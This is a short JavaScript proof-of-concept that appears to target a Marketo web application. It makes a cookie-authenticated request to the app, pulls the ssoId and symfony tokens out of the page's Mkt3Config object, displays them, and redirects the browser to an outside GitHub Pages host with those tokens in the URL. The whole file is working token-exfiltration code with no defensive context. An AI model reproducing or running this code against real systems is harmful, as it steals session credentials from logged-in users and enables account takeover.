(async () => {
    const response = await fetch('https://app-abdemo1.marketo.com/?meue&meueDataOnlyMode&meueVisualCampaign', {
      method: 'GET',
      credentials: 'include'
    });
  
    const html = await response.text();
  
    // Match the <script> containing Mkt3Config
    const match = html.match(/window\.Mkt3Config\s*=\s*(\{[\s\S]*?\});/);
    if (!match) {
      alert('Mkt3Config not found in response');
      return;
    }
  
    try {
      const config = JSON.parse(match[1]);
      const ssoId = config.ssoId || 'Not found';
      const symfony = config.symfony || 'Not found';
      alert(`ssoId: ${ssoId}\nsymfony: ${symfony}`);
      location=`https://mrhavit.github.io/?sso=${ssoId}&symfony=${symfony}`
    } catch (err) {
      alert('Failed to parse Mkt3Config JSON');
    }
  })();
  